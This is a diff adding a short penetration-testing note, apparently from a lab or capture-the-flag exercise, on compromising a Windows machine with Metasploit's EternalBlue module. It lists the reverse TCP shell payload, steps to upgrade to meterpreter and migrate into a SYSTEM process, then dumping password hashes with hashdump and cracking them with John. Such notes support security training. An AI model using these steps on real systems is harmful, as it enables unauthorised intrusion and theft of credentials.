@@ -1,0 +1,23 @@
+Windows machine:
+Gain access using metasploit using eternalblue exploit
+
+use below payload for a reverse tcp shell: set payload windows/x64/shell/reverse_tcp
+
+For converting a shell to meterpreter shell in metasploit:
+- background the session
+- use post/multi/manage/shell_to_meterpreter
+- use the new sessions created (sessions -i 2)
+- try getuid in the shell
+- shell command will open the dos shell
+- use ps to list the process to migrate to the different process_id 
+  that is running as NT Authority\System.
+- Try to use spoolsv.exe process which will give you a more stable shell.
+
+Spoolsv.exe is an executable file that runs the Print Spooler Service, 
+a process that caches printing jobs into system memory as images as 
+printers cannot understand fonts or decipher graphics.
+
+- Use hashdump that will dump all the passwords on the machine.
+- Use john to crack the user's password hash.
+
+
